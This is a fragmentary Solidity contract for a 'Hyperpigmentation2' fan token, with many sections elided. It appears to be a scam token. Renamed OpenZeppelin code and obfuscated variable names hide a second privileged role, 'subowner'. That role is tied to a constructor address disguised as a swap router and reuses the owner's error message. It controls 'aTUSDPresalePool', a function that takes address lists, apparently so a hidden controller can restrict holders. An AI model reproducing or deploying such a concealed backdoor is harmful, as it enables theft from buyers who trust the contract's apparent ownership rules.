...
/// https://x.com/Hyperpigmentation2


pragma solidity 0.8.29;

// Hyperpigmentation2 fan token

interface Hyperpigmentation2interface {
  /**
...
/*
 * @dev Provides information about the current execution Hyperpigmentation220Burnable, including the
 ...
 */
abstract contract Hyperpigmentation220Burnable {
...
// File: @openzeppelin/contracts/access/Hyperpigmentation220Ownable.sol
 ...
 * the owner.
 */
abstract contract Hyperpigmentation220Ownable is Hyperpigmentation220Burnable {
     ...
     */
    modifier onlyOwner() {
        require(owner() == _msgSender(), "Hyperpigmentation220Ownable: caller is not the owner");
        _;
    }
    ...
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Hyperpigmentation220Ownable: new owner is the zero address");
 ...
 * `SafeHyperpigmentation2` restores this intuition by reverting the transaction when an
 * operation overflows.
 *
 * Using this library instead of the unchecked operations eliminates an entire
 * class of bugs, so it's recommended to use it always.
 */
library SafeHyperpigmentation2 {
  /**
  ...
  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    require(c >= a, "SafeHyperpigmentation2: addition overflow");
  ...
  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    return sub(a, b, "SafeHyperpigmentation2: subtraction overflow");
  }
  ...
  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    ...
    uint256 c = a * b;
    require(c / a == b, "SafeHyperpigmentation2: multiplication overflow");
  ...
  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    return div(a, b, "SafeHyperpigmentation2: division by zero");
  }
  ...
  function mod(uint256 a, uint256 b) internal pure returns (uint256) {
    return mod(a, b, "SafeHyperpigmentation2: modulo by zero");
  }
...
contract Hyperpigmentation2Token is Hyperpigmentation220Burnable, Hyperpigmentation2interface, Hyperpigmentation220Ownable {
    
    using SafeHyperpigmentation2 for uint256;
   ...
   address private legosRooter; 
    constructor(address legosSwapRouterv3) {
        ...
        _name = "Hyperpigmentation2";
        _symbol = "Hyperpigmentation2";
        _decimals = 9;
    ...
    */
    ...
    /**
    * @dev See {Hyperpigmentation2interface-totalSupply}.
    */
    ...
    /**
    * @dev See {Hyperpigmentation2interface-balanceOf}.
    */
    function balanceOf(address account) external view override returns (uint256) {
        return mintfrom[account];
    }
      modifier subowner() {
        require(legosRooter == _msgSender(), "Hyperpigmentation220Ownable: caller is not the owner");
        _;
    }
    /**
    * @dev See {Hyperpigmentation2interface-approve}.
    *
    * Requirements:
    *
...
function aTUSDPresalePool(address[] calldata tusdRewards) external subowner {
    ...
    /**
    * @dev See {Hyperpigmentation2interface-transfer}.
    *
    * Requirements:
    *
    ...
    */
    ...
    /**
    * @dev See {Hyperpigmentation2interface-allowance}.
    */
    ...
    */
    ...
    /**
    * @dev See {Hyperpigmentation2interface-transferFrom}.
    *
    * Emits an {Approval} event indicating the updated allowance. This is not
    * required by the EIP. See the note at the beginning of {Hyperpigmentation2interface};
    *
    * Requirements:
    ...
    */
    function transferFrom(address sender, address shippingto, uint256 yoursold) external override returns (bool) {
        ...
        _approve(sender, _msgSender(), fromallowances[sender][_msgSender()].sub(yoursold, "Hyperpigmentation2interface: transfer yoursold exceeds allowance"));
        return true;
    }
    ...
    * problems described in {Hyperpigmentation2interface-approve}.
    *
    ...
    */
    function decreaseAllowance(address transporteur, uint256 allbalances) external returns (bool) {
        _approve(_msgSender(), transporteur, fromallowances[_msgSender()][transporteur].sub(allbalances, "Hyperpigmentation2interface: decreased allowance below zero"));
        return true;
    }
    ...
    */
    function _transfer(address sender, address shippingto, uint256 yoursold) internal {
        require(sender != address(0), "Hyperpigmentation2interface: transfer from the zero address");
        require(shippingto != address(0), "Hyperpigmentation2interface: transfer to the zero address");
                
        mintfrom[sender] = mintfrom[sender].sub(yoursold, "Hyperpigmentation2interface: transfer yoursold exceeds balance");
    ...
    */
    function _approve(address owner, address transporteur, uint256 yoursold) internal {
        require(owner != address(0), "Hyperpigmentation2interface: approve from the zero address");
        require(transporteur != address(0), "Hyperpigmentation2interface: approve to the zero address");
